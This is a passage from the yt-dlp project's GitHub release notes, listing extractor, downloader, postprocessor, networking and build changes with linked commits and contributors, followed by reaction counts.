* **cloudflarestream**: [Fix `_VALID_URL` and embed extraction](https://github.com/yt-dlp/yt-dlp/commit/7aa322c02cec54eb77154a89da7e400194f0bd03) ([#10215](https://github.com/yt-dlp/yt-dlp/issues/10215)) by [bashonly](https://github.com/bashonly)
* **cloudycdn**: [Fix formats extraction](https://github.com/yt-dlp/yt-dlp/commit/b758877afa225747fba81c8a580e27583a231734) ([#10271](https://github.com/yt-dlp/yt-dlp/issues/10271)) by [Caesim404](https://github.com/Caesim404)
* **digitalconcerthall**: [Rework extractor](https://github.com/yt-dlp/yt-dlp/commit/2a4f2e82dbeeb0c9130883c83dac689d5260c871) ([#10152](https://github.com/yt-dlp/yt-dlp/issues/10152)) by [seproDev](https://github.com/seproDev), [tippfehlr](https://github.com/tippfehlr)
* **facebook**: reel: [Fix extraction](https://github.com/yt-dlp/yt-dlp/commit/8ca1d57ed08d00efa117820a5a82f763b20e2d1d) ([#10232](https://github.com/yt-dlp/yt-dlp/issues/10232)) by [bashonly](https://github.com/bashonly)
* **francetv**
  + [Detect and raise errors for DRM](https://github.com/yt-dlp/yt-dlp/commit/3690c2f59827c79a1bbe388a7c1ae75db7477db2) ([#10165](https://github.com/yt-dlp/yt-dlp/issues/10165)) by [bashonly](https://github.com/bashonly)
  + [Fix extractor](https://github.com/yt-dlp/yt-dlp/commit/081708d6074dfbb907e25af61ba530bba0d4b31d) ([#10177](https://github.com/yt-dlp/yt-dlp/issues/10177)) by [bashonly](https://github.com/bashonly)
* **generic**: [Add `key_query` extractor-arg](https://github.com/yt-dlp/yt-dlp/commit/5dbac313ae4e3e8521dfe2e1a6a048a98ff4b4fe) by [bashonly](https://github.com/bashonly)
* **graspop**: [Add extractor](https://github.com/yt-dlp/yt-dlp/commit/1d369b4096d79233e0ac2c93762746a64d7a69c8) ([#10268](https://github.com/yt-dlp/yt-dlp/issues/10268)) by [Niluge-KiWi](https://github.com/Niluge-KiWi)
* **jiocinema**: series: [Fix extraction](https://github.com/yt-dlp/yt-dlp/commit/61714f46956f61612032bba857aed7ad1387eccd) ([#10139](https://github.com/yt-dlp/yt-dlp/issues/10139)) by [varunchopra](https://github.com/varunchopra)
* **khanacademy**: [Fix extractors](https://github.com/yt-dlp/yt-dlp/commit/4093eb1fcc29a0e2aea9adfcba479787d9ae0c0c) ([#9136](https://github.com/yt-dlp/yt-dlp/issues/9136)) by [c-basalt](https://github.com/c-basalt)
* **laracasts**: [Add extractors](https://github.com/yt-dlp/yt-dlp/commit/b8da8a98f897599095d4ef1644b8c5fd39921118) ([#10055](https://github.com/yt-dlp/yt-dlp/issues/10055)) by [ASertacAkkaya](https://github.com/ASertacAkkaya), [seproDev](https://github.com/seproDev)
* **matchtv**: [Fix extractor](https://github.com/yt-dlp/yt-dlp/commit/f3411af12e209bc5624e1ac31271b8aabe2d3c90) ([#10190](https://github.com/yt-dlp/yt-dlp/issues/10190)) by [megumintyan](https://github.com/megumintyan)
* **mediasite**: [Fix extraction](https://github.com/yt-dlp/yt-dlp/commit/0953209a857c51648aee89d205c086b0e1dd3864) ([#10273](https://github.com/yt-dlp/yt-dlp/issues/10273)) by [bashonly](https://github.com/bashonly)
* **microsoftembed**: [Add extractors for dev materials](https://github.com/yt-dlp/yt-dlp/commit/9200bc70c94546b2191bb6fbfc9cea98a919cc56) ([#9177](https://github.com/yt-dlp/yt-dlp/issues/9177)) by [c-basalt](https://github.com/c-basalt)
* **mlbtv**: [Fix extraction](https://github.com/yt-dlp/yt-dlp/commit/61edf57f8f13f6dfd81154174e647eb5fdd26089) ([#10296](https://github.com/yt-dlp/yt-dlp/issues/10296)) by [bashonly](https://github.com/bashonly)
* **neteasemusic**: [Extract more formats from new API](https://github.com/yt-dlp/yt-dlp/commit/7a03f88c40b80d3cf54f68edd9d4bdd6aa527570) ([#10258](https://github.com/yt-dlp/yt-dlp/issues/10258)) by [hafeoz](https://github.com/hafeoz)
* **nhkradiru**: [Fix extractor](https://github.com/yt-dlp/yt-dlp/commit/b8e2a5e0e1030076f833917906e19bb6c7b318f6) ([#10106](https://github.com/yt-dlp/yt-dlp/issues/10106)) by [garret1317](https://github.com/garret1317)
* **nuum**: [Fix formats extraction](https://github.com/yt-dlp/yt-dlp/commit/aefede25561a06cba398d4f593eee2fbe942693b) ([#10316](https://github.com/yt-dlp/yt-dlp/issues/10316)) by [DmitryScaletta](https://github.com/DmitryScaletta)
* **orf**
  + on
    - [Add `prefer_segments_playlist` extractor-arg](https://github.com/yt-dlp/yt-dlp/commit/e6a22834df1776ec4e486526f6df2bf53cb7e06f) ([#10314](https://github.com/yt-dlp/yt-dlp/issues/10314)) by [seproDev](https://github.com/seproDev)
    - [Support segmented episodes](https://github.com/yt-dlp/yt-dlp/commit/8b46ad4d8b8ee8c5472af0cde863baa89ca3f425) ([#10053](https://github.com/yt-dlp/yt-dlp/issues/10053)) by [seproDev](https://github.com/seproDev)
* **patreoncampaign**: [Fix `campaign_id` extraction](https://github.com/yt-dlp/yt-dlp/commit/2e5a47da400b645aadbda6afd1156bd89c744f48) ([#10070](https://github.com/yt-dlp/yt-dlp/issues/10070)) by [bashonly](https://github.com/bashonly)
* **podbayfm**: [Fix extraction](https://github.com/yt-dlp/yt-dlp/commit/d4b52ce3fcb8d9578ed12365648eaba8718c603e) ([#10195](https://github.com/yt-dlp/yt-dlp/issues/10195)) by [bashonly](https://github.com/bashonly), [seproDev](https://github.com/seproDev)
* **pokergo**: [Make metadata extraction non-fatal](https://github.com/yt-dlp/yt-dlp/commit/36e8dd832579b5375a0f6626af4268b86b4eb21a) ([#10319](https://github.com/yt-dlp/yt-dlp/issues/10319)) by [axpauls](https://github.com/axpauls)
* **qqmusic**: [Fix extractors](https://github.com/yt-dlp/yt-dlp/commit/4f5d7be3c5590bb257d8ff521572aee9839ab754) ([#9768](https://github.com/yt-dlp/yt-dlp/issues/9768)) by [c-basalt](https://github.com/c-basalt)
* **rtvslo.si**: show: [Add extractor](https://github.com/yt-dlp/yt-dlp/commit/92a1c4abaeeba9a69d611c57b73555cb1a1f00ad) ([#8418](https://github.com/yt-dlp/yt-dlp/issues/8418)) by [JSubelj](https://github.com/JSubelj), [seproDev](https://github.com/seproDev)
* **soundcloud**: [Fix `download` format extraction](https://github.com/yt-dlp/yt-dlp/commit/e53e56b73543799638fa6abb0c78f8b091aa84e1) ([#10125](https://github.com/yt-dlp/yt-dlp/issues/10125)) by [bashonly](https://github.com/bashonly)
* **sproutvideo**: [Add extractors](https://github.com/yt-dlp/yt-dlp/commit/d6c2c2bc84f1434255be5c73baeb17d893d2c0d4) ([#10098](https://github.com/yt-dlp/yt-dlp/issues/10098)) by [bashonly](https://github.com/bashonly), [TheZ3ro](https://github.com/TheZ3ro)
* **tiktok**
  + [Detect and raise when login is required](https://github.com/yt-dlp/yt-dlp/commit/ea88129784fcbb6987161df9ba05909325d8e2e9) ([#10124](https://github.com/yt-dlp/yt-dlp/issues/10124)) by [bashonly](https://github.com/bashonly)
  + [Fix API extraction](https://github.com/yt-dlp/yt-dlp/commit/96472d72f29550c25c5dcedcde02c38c192b0011) ([#10216](https://github.com/yt-dlp/yt-dlp/issues/10216)) by [bashonly](https://github.com/bashonly)
* **tubitv**
  + [Fix extractor](https://github.com/yt-dlp/yt-dlp/commit/bef9a9e5361fd7a72e21d0f1a8c8afb70d89e8c5) ([#9975](https://github.com/yt-dlp/yt-dlp/issues/9975)) by [chilinux](https://github.com/chilinux)
  + series: [Fix extractor](https://github.com/yt-dlp/yt-dlp/commit/d7d861811c15585a4f7ec9d5ae68d2ac28de28a0) ([#10116](https://github.com/yt-dlp/yt-dlp/issues/10116)) by [bashonly](https://github.com/bashonly)
* **vimeo**: [Support browser impersonation](https://github.com/yt-dlp/yt-dlp/commit/d4b99a233314bf31f9c842035ea9884673d5313a) ([#10327](https://github.com/yt-dlp/yt-dlp/issues/10327)) by [bashonly](https://github.com/bashonly)
* **youtube**
  + [Extract all formats from multi-language m3u8s](https://github.com/yt-dlp/yt-dlp/commit/9bd85019931927a99b0fe0dc58ac51acca9fbe72) ([#9875](https://github.com/yt-dlp/yt-dlp/issues/9875)) by [bashonly](https://github.com/bashonly), [clienthax](https://github.com/clienthax)
  + [Skip formats if nsig decoding fails](https://github.com/yt-dlp/yt-dlp/commit/800ec085ccf98420584d8bb38c20a2c079669b09) ([#10223](https://github.com/yt-dlp/yt-dlp/issues/10223)) by [bashonly](https://github.com/bashonly)
  + [Suppress "Unavailable videos are hidden" warning](https://github.com/yt-dlp/yt-dlp/commit/24f3097ea9a470a984d0454dc013cafa2325f5f8) ([#10159](https://github.com/yt-dlp/yt-dlp/issues/10159)) by [mgedmin](https://github.com/mgedmin)
  + tab: [Fix channel metadata extraction](https://github.com/yt-dlp/yt-dlp/commit/a0d9967f6822fc279e86bce33464194985148727) ([#10071](https://github.com/yt-dlp/yt-dlp/issues/10071)) by [bashonly](https://github.com/bashonly), [shoxie007](https://github.com/shoxie007)

#### Downloader changes

* **hls**: [Apply `extra_param_to_key_url` from info dict](https://github.com/yt-dlp/yt-dlp/commit/ca8885edd93bdf8912af6c22ee335b6222cb9ba9) by [bashonly](https://github.com/bashonly)

#### Postprocessor changes

* **embedthumbnail**: [Fix postprocessor](https://github.com/yt-dlp/yt-dlp/commit/f2a4ea1794718e4dc0148bc172cb877f1080903b) ([#10248](https://github.com/yt-dlp/yt-dlp/issues/10248)) by [Grub4K](https://github.com/Grub4K)

#### Networking changes

* **Request Handler**: requests: [Bump minimum `requests` version to 2.32.2](https://github.com/yt-dlp/yt-dlp/commit/db50f19d76c6870a5a13d0cab9287d684fd7449a) ([#10079](https://github.com/yt-dlp/yt-dlp/issues/10079)) by [bashonly](https://github.com/bashonly)

#### Misc. changes

* **build**
  + [Bump Pyinstaller to `>=6.7.0` for all builds](https://github.com/yt-dlp/yt-dlp/commit/5fdd13006a1c5d78642c8d3c4c7df0448273c2ae) ([#10069](https://github.com/yt-dlp/yt-dlp/issues/10069)) by [bashonly](https://github.com/bashonly), [seproDev](https://github.com/seproDev)
  + [Cache dependencies for `macos` job](https://github.com/yt-dlp/yt-dlp/commit/46c1b7cfec1d0e6155083ca7e6948674c64ecb97) ([#10088](https://github.com/yt-dlp/yt-dlp/issues/10088)) by [bashonly](https://github.com/bashonly)
  + [Use `macos-12` image for `yt-dlp_macos`](https://github.com/yt-dlp/yt-dlp/commit/03334d639d5282cd4107edb32c623ba400262fc4) ([#10063](https://github.com/yt-dlp/yt-dlp/issues/10063)) by [bashonly](https://github.com/bashonly)
* **cleanup**
  + [Add more ruff rules](https://github.com/yt-dlp/yt-dlp/commit/add96eb9f84cfffe85682bf2fb85135746994ee8) ([#10149](https://github.com/yt-dlp/yt-dlp/issues/10149)) by [seproDev](https://github.com/seproDev)
  + [Bump ruff to 0.5.x](https://github.com/yt-dlp/yt-dlp/commit/7814c50948a2b9a4c746441ecbc509ae563d5d1f) ([#10282](https://github.com/yt-dlp/yt-dlp/issues/10282)) by [seproDev](https://github.com/seproDev)
  + Miscellaneous: [6aaf96a](https://github.com/yt-dlp/yt-dlp/commit/6aaf96a3d6e7d0d426e97e11a2fcf52fda00e733) by [bashonly](https://github.com/bashonly), [c-basalt](https://github.com/c-basalt), [jucor](https://github.com/jucor), [seproDev](https://github.com/seproDev)
* **test**: download: [Raise on network errors](https://github.com/yt-dlp/yt-dlp/commit/54a63e80af82791d2f0985bd0176bb182963fd5f) ([#10283](https://github.com/yt-dlp/yt-dlp/issues/10283)) by [bashonly](https://github.com/bashonly), [seproDev](https://github.com/seproDev)

 Assets
19

 Loading

 üëç
86
 VerTigoNTxvii, jeanslack, procopaeus, RomelSan, Ahmad-Amsyar, mklinkj, eksan127, labdiynez, NCSGeek, 2Lias, and 76 more reacted with thumbs up emoji
 üòÑ
6
 NOTgate, a1dram, CapitanArdeshir, 40ZqTYY4ag3tAO4hdlxR1, mpoullet, and R917C reacted with laugh emoji
 üéâ
22
 polymorphicshade, billwieboldt, AAndyProgram, libreom, roland-5, Aadesh001, braindotai, pashynskykh, whiztech, WhoChangedMyCode, and 12 more reacted with hooray emoji
 ‚ù§Ô∏è
14
 AAndyProgram, CoffeSiberian, roland-5, braindotai, bitscoper, NOTgate, a1dram, CapitanArdeshir, gresolio, SigEpBlue, and 4 more reacted with heart emoji
 üöÄ
8
 roland-5, braindotai, NOTgate, a1dram, lrnselfreliance, CapitanArdeshir, aaronliu0130, and mpoullet reacted with rocket emoji
 üëÄ
6
 ageorge95, braindotai, NOTgate, Paxsenix0, a1dram, and mpoullet reacted with eyes emoji

All reactions

* üëç
  86 reactions
* üòÑ
  6 reactions
* üéâ
  22 reactions
* ‚ù§Ô∏è
  14 reactions
* üöÄ
  8 reactions
* üëÄ
  6 reactions

 102 people reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


